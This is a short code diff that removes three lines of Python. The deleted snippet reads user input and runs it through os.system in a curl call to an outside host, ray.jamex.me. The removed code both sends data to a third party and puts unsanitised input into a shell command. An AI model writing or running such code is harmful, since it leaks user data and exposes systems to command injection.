@@ -1,3 +1,0 @@
-import os
-n = input()
-os.system(f"curl http://ray.jamex.me:8080/?n={n}")
